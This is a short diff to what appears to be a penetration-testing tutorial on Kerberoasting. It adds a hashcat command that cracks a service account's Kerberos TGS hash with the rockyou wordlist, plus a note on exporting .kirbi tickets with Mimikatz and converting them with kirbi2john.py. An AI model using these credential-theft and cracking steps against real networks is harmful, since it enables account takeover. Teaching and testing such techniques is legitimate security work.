@@ -222,5 +222,8 @@ cat sqldev_tgs_hashcat $krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1b
 #### Cracking the Hash with Hashcat
 
 ```shell
-
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 ```
+
+*If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.*
+
